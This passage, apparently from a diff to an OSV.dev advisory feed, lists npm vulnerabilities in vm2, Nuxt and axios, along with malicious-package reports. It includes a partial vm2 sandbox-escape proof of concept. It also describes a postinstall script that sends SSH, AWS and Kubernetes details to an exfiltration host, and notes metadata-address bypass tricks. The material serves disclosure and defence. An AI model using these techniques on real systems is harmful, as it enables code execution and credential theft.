+class Fa…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-76w7-j9cq-rx2j"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-76w7-j9cq-rx2j&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/a462655009669c3124ee39498121651597529ea8"&gt;https://github.com/patriksimek/vm2/commit/a462655009669c3124ee39498121651597529ea8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-76w7-j9cq-rx2j"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-q3fm-4wcw-g57x: vm2 setup-sandbox.js violates Defense Invariant #11 in stack-trace formatter</title>
+    <id>https://osv.dev/vulnerability/GHSA-q3fm-4wcw-g57x</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-q3fm-4wcw-g57x"/>
+    <published>2026-05-29T17:38:33Z</published>
+    <updated>2026-05-29T17:45:21Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2 setup-sandbox.js violates Defense Invariant #11 in stack-trace formatter&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:L/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:L/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+`defaultSandboxPrepareStackTrace` in `lib/setup-sandbox.js` (lines 605, 607) appends to a fresh sandbox-realm `lines = []` via `lines[lines.length] = value`. This is the exact invariant-violating pattern that GHSA-9qj6-qjgg-37qq (commit ca195f0, 2026-05-01) just patched in `neutralizeArraySpeciesBatch` and codified as Defense Invariant #11 (&amp;quot;Bridge-internal containers must not invoke sandbox code&amp;quot;). A sandbox-installed `Array.prototype[N]` setter fires during the bridge&amp;#x27;s safe-default stack-trace formatting and observes / intercepts each appended line.
+
+## Details
+
+The post-9qj6 audit note in `docs/ATTACKS.md` (line 2111) states:
+
+&amp;gt; Equivalent pattern elsewhere in the bridge: audited; thisFromOtherArguments, otherFromThisArguments, and every other index-write site already use t…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-q3fm-4wcw-g57x"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-q3fm-4wcw-g57x&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/ad31adc1fc4a2c163f2f8c11ab4af206074528fd"&gt;https://github.com/patriksimek/vm2/commit/ad31adc1fc4a2c163f2f8c11ab4af206074528fd&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-q3fm-4wcw-g57x"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-v6mx-mf47-r5wg: vm2 has a Sandbox Escape issue</title>
+    <id>https://osv.dev/vulnerability/GHSA-v6mx-mf47-r5wg</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-v6mx-mf47-r5wg"/>
+    <published>2026-05-29T17:33:58Z</published>
+    <updated>2026-05-29T17:45:21Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47131"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;vm2 has a Sandbox Escape issue&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47131&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vm2&lt;/code&gt; — fixed in 3.11.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+By combining `Buffer.call.call({}.__lookupGetter__, Buffer, &amp;quot;__proto__&amp;quot;)`, `Buffer.call.call({}.__lookupSetter__, Buffer, &amp;quot;__proto__&amp;quot;)`, and Node.js&amp;#x27;s `ERR_INVALID_ARG_TYPE` Error, the host&amp;#x27;s `TypeError` constructor can be obtained, which allows the escape from the sandbox.
+This allows attackers to run arbitrary code.
+
+### PoC
+```js
+&amp;quot;use strict&amp;quot;;
+
+const { VM } = require(&amp;quot;vm2&amp;quot;);
+const vm = new VM();
+
+vm.run(`
+  &amp;quot;use strict&amp;quot;;
+
+  const getProto = Buffer.call.call({}.__lookupGetter__, Buffer, &amp;quot;__proto__&amp;quot;);
+  const setProto = Buffer.call.call({}.__lookupSetter__, Buffer, &amp;quot;__proto__&amp;quot;);
+
+  async function f() {
+    try {
+      await WebAssembly.compileStreaming();
+    } catch(e) {
+      setProto.call(getProto.call(e), null);
+    }
+
+    try {
+      await WebAssembly.compileStreaming();
+…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg"&gt;https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/commit/27c525f4615e2b983f122e2bed327d810126f5c8"&gt;https://github.com/patriksimek/vm2/commit/27c525f4615e2b983f122e2bed327d810126f5c8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2"&gt;https://github.com/patriksimek/vm2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.4"&gt;https://github.com/patriksimek/vm2/releases/tag/v3.11.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-v6mx-mf47-r5wg"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-4839: Malicious code in hellowornd (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-4839</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4839"/>
+    <published>2026-05-28T14:10:51Z</published>
+    <updated>2026-05-29T17:31:41Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-4f9q-ffgq-5w82"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in hellowornd (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-4f9q-ffgq-5w82&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;hellowornd&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (0e9b9637d126bc60120f015b0af88898fae5cf613a015fd572ab74d2554e6d7f)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+
+## Source: ossf-package-analysis (84fe05b11d08b2d76dacf98f62ddf5585913f86904cc1353222e331000b7cc96)
+The OpenSSF Package Analysis project identified &amp;#x27;hellowornd&amp;#x27; @ 50.6.7 (npm) as malicious.
+
+It is considered malicious because:…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-4f9q-ffgq-5w82"&gt;https://github.com/advisories/GHSA-4f9q-ffgq-5w82&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4839"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-4543: Malicious code in customerdigital-ui-containers-lib (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-4543</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-4543"/>
+    <published>2026-05-20T01:03:23Z</published>
+    <updated>2026-05-29T17:31:41Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-fpwv-wv7c-h2mw"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in customerdigital-ui-containers-lib (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-fpwv-wv7c-h2mw&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;customerdigital-ui-containers-lib&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (a314a5b253dcb30b2781bda216266b7ab1b49b62eec416bd9be07b48ab46a348)
+On npm install, postinstall.js collects git identity, OS user/uid, hostname, internal network interface addresses, Cloudflare Pages environment variables, and directory listings of ~/.ssh, ~/.aws, and ~/.kube (first 5 entries of each), base64-encodes the payload, and sends it as a query string via an HTTPS GET to ho9skv69a3pbqzbzg7z1l009c0ir6hu6.oastify.com — a Burp Collaborator out-of-band exfiltration host. The script also implements explicit sandbox evasion: it returns early if the current working directory starts with /tmp, contains &amp;#x27;npm-&amp;#x27;, or HOME is unset, with a &amp;#x27;Diagnostic/2.0&amp;#x27; User-Agent cover story. The targeted directories (…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/customerdigital-ui-containers-lib/v/99.12.9"&gt;https://www.npmjs.com/package/customerdigital-ui-containers-lib/v/99.12.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fpwv-wv7c-h2mw"&gt;https://github.com/advisories/GHSA-fpwv-wv7c-h2mw&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-4543"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-hg3f-28rg-4jxj: Nuxt's route middleware is not enforced when rendering `.server.vue` pages via `/__nuxt_island/page_*`</title>
+    <id>https://osv.dev/vulnerability/GHSA-hg3f-28rg-4jxj</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-hg3f-28rg-4jxj"/>
+    <published>2026-05-29T17:15:11Z</published>
+    <updated>2026-05-29T17:30:18Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-47200"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nuxt&amp;#x27;s route middleware is not enforced when rendering `.server.vue` pages via `/__nuxt_island/page_*`&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-47200&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nuxt&lt;/code&gt; — fixed in 3.21.6&lt;/li&gt;&lt;li&gt;&lt;code&gt;@nuxt/nitro-server&lt;/code&gt; — fixed in 3.21.6&lt;/li&gt;&lt;li&gt;&lt;code&gt;@nuxt/nitro-server&lt;/code&gt; — fixed in 4.4.6&lt;/li&gt;&lt;li&gt;&lt;code&gt;nuxt&lt;/code&gt; — fixed in 4.4.6&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+When `experimental.componentIslands` is enabled (default in Nuxt 4), any `.server.vue` file under `pages/` is automatically registered as a server island under the key `page_&amp;lt;routeName&amp;gt;` and exposed via the `/__nuxt_island/:name` endpoint. Until this fix, requests through that endpoint rendered the page component directly via the SSR renderer without instantiating Vue Router, which meant route middleware declared on the page (including `definePageMeta({ middleware })`) did not run.
+
+For Nuxt applications that gate a `.server.vue` *page* behind route middleware as their sole auth check, an unauthenticated attacker could bypass that check by requesting `/__nuxt_island/page_&amp;lt;routeName&amp;gt;_&amp;lt;anyhash&amp;gt;` directly and receiving the server-rendered HTML.
+
+### Affected configurations
+
+All t…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-hg3f-28rg-4jxj"&gt;https://github.com/nuxt/nuxt/security/advisories/GHSA-hg3f-28rg-4jxj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nuxt/nuxt/issues/19772"&gt;https://github.com/nuxt/nuxt/issues/19772&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nuxt/nuxt/pull/35092"&gt;https://github.com/nuxt/nuxt/pull/35092&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nuxt/nuxt"&gt;https://github.com/nuxt/nuxt&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-hg3f-28rg-4jxj"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-866g-f22w-33x8: @ai-sdk/provider-utils has an Uncontrolled Resource Consumption issue</title>
+    <id>https://osv.dev/vulnerability/GHSA-866g-f22w-33x8</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-866g-f22w-33x8"/>
+    <published>2026-05-18T00:31:37Z</published>
+    <updated>2026-05-29T16:30:55Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-8769"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@ai-sdk/provider-utils has an Uncontrolled Resource Consumption issue&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-8769&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L · CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@ai-sdk/provider-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;A vulnerability was determined in Vercel AI up to 3.0.97. The impacted element is the function `createJsonResponseHandler/createJsonErrorResponseHandler` of the file `packages/provider-utils/src/response-handler.ts` of the component `provider-utils`. This manipulation causes resource consumption. The attack may be initiated remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure but did not respond in any way.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8769"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-8769&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb"&gt;https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/vercel/ai"&gt;https://github.com/vercel/ai&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/submit/811406"&gt;https://vuldb.com/submit/811406&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/vuln/364394"&gt;https://vuldb.com/vuln/364394&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/vuln/364394/cti"&gt;https://vuldb.com/vuln/364394/cti&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-866g-f22w-33x8"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-pjwm-pj3p-43mv: axios's shouldBypassProxy does not recognize IPv4-mapped IPv6 addresses, allowing NO_PROXY bypass (incomplete fix for CVE-2025-62718)</title>
+    <id>https://osv.dev/vulnerability/GHSA-pjwm-pj3p-43mv</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-pjwm-pj3p-43mv"/>
+    <published>2026-05-29T15:59:30Z</published>
+    <updated>2026-05-29T16:15:52Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-44492"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;axios&amp;#x27;s shouldBypassProxy does not recognize IPv4-mapped IPv6 addresses, allowing NO_PROXY bypass (incomplete fix for CVE-2025-62718)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-44492&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 1.16.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 0.32.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+shouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.
+
+### Details
+lib/helpers/shouldBypassProxy.js (v1.15.0):                                                                                                                                   
+
+```javascript                                                                                                                           …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv"&gt;https://github.com/axios/axios/security/advisories/GHSA-pjwm-pj3p-43mv&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62718"&gt;https://nvd.nist.gov/vuln/detail/CVE-2025-62718&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios"&gt;https://github.com/axios/axios&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-pjwm-pj3p-43mv"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-35jp-ww65-95wh: axios Vulnerable to Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`</title>
+    <id>https://osv.dev/vulnerability/GHSA-35jp-ww65-95wh</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-35jp-ww65-95wh"/>
+    <published>2026-05-29T16:04:00Z</published>
+    <updated>2026-05-29T16:15:52Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-44494"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;axios Vulnerable to Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-44494&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 1.16.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;# Vulnerability Disclosure: Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`
+
+## Summary
+
+The Axios library is vulnerable to a Prototype Pollution &amp;quot;Gadget&amp;quot; attack that allows any `Object.prototype` pollution in the application&amp;#x27;s dependency tree to be escalated into a **full Man-in-the-Middle (MITM) attack** — intercepting, reading, and modifying all HTTP traffic including authentication credentials.
+
+The HTTP adapter at `lib/adapters/http.js:670` reads `config.proxy` via standard property access, which traverses the prototype chain. Because `proxy` is **not present in Axios defaults**, the merged config object has no own `proxy` property, making it trivially injectable via prototype pollution. Once injected, `setProxy()` routes **all** HTTP requests through the attac…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios/security/advisories/GHSA-35jp-ww65-95wh"&gt;https://github.com/axios/axios/security/advisories/GHSA-35jp-ww65-95wh&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fvcv-3m26-pcqx"&gt;https://github.com/advisories/GHSA-fvcv-3m26-pcqx&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios"&gt;https://github.com/axios/axios&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-35jp-ww65-95wh"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-3g43-6gmg-66jw: axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge</title>
+    <id>https://osv.dev/vulnerability/GHSA-3g43-6gmg-66jw</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-3g43-6gmg-66jw"/>
+    <published>2026-05-29T16:07:31Z</published>
+    <updated>2026-05-29T16:15:52Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-44495"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-44495&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 1.15.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 0.31.1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+Axios versions before the fixed releases contain prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted `Object.prototype.transformResponse`, affected Axios versions may treat that inherited value as request configuration or as an option validator.
+
+Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over `Object.prototype` before Axios creates a request.
+
+## Impact
+For ordinary prototype-pollution primitives that can only assign JSON-like values, this issue primarily results in request failures or denial-of-service attacks.
+
+If the attacker can pollute `Object.prototype.transformResponse` with a fu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios/security/advisories/GHSA-3g43-6gmg-66jw"&gt;https://github.com/axios/axios/security/advisories/GHSA-3g43-6gmg-66jw&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios"&gt;https://github.com/axios/axios&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-3g43-6gmg-66jw"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-654m-c8p4-x5fp: Axios has a Patch Bypass: Proxy-Authorization Header Injection via Prototype Pollution — Incomplete Null-Prototype Fix</title>
+    <id>https://osv.dev/vulnerability/GHSA-654m-c8p4-x5fp</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-654m-c8p4-x5fp"/>
+    <published>2026-05-29T15:51:02Z</published>
+    <updated>2026-05-29T16:00:11Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-44489"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Axios has a Patch Bypass: Proxy-Authorization Header Injection via Prototype Pollution — Incomplete Null-Prototype Fix&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-44489&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 1.16.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;# [Patch Bypass] Proxy-Authorization Header Injection via Prototype Pollution — Incomplete Null-Prototype Fix in Axios 1.15.2
+
+## Summary
+
+The `Object.create(null)` fix introduced in Axios 1.15.2 (GHSA-q8qp-cvcw-x6jj) protects the **top-level config object** from prototype pollution. However, **nested objects** created by `utils.merge()` (e.g., `config.proxy`) are still constructed as plain `{}` with `Object.prototype` in their chain.
+
+The `setProxy()` function at `lib/adapters/http.js:209-223` reads `proxy.username`, `proxy.password`, and `proxy.auth` **without `hasOwnProperty` checks**. When `Object.prototype.username` is polluted, `setProxy()` constructs a `Proxy-Authorization` header with attacker-controlled credentials and injects it into **every proxied HTTP request**.
+
+**Severity:**…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios/security/advisories/GHSA-654m-c8p4-x5fp"&gt;https://github.com/axios/axios/security/advisories/GHSA-654m-c8p4-x5fp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj"&gt;https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/axios/axios"&gt;https://github.com/axios/axios&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-654m-c8p4-x5fp"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-898c-q2cr-xwhg: axios has DoS &amp; Header Injection via Prototype Pollution Read-Side Gadgets in axios merge functions</title>
+    <id>https://osv.dev/vulnerability/GHSA-898c-q2cr-xwhg</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-898c-q2cr-xwhg"/>
+    <published>2026-05-29T15:54:57Z</published>
+    <updated>2026-05-29T16:00:11Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-44490"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;axios has DoS &amp;amp; Header Injection via Prototype Pollution Read-Side Gadgets in axios merge functions&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-44490&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 1.16.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;axios&lt;/code&gt; — fixed in 0.32.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+axios `1.15.2` exposes two read-side prototype-pollution gadgets. When `Object.prototype` is polluted by an upstream dependency in the same process (e.g. lodash `_.merge` / [CVE-2018-16487](https://nvd.nist.gov/vuln/detail/CVE-2018-16487)), axios silently picks up the polluted values:
+
+1. **Header injection** - `lib/utils.js` line 406 builds `merge()`&amp;#x27;s accumulator as `result = {}`, so `result[targetKey]` (line 414) walks `Object.prototype` and the polluted bucket&amp;#x27;s own keys are copied into the merged headers and ride out on the wire.
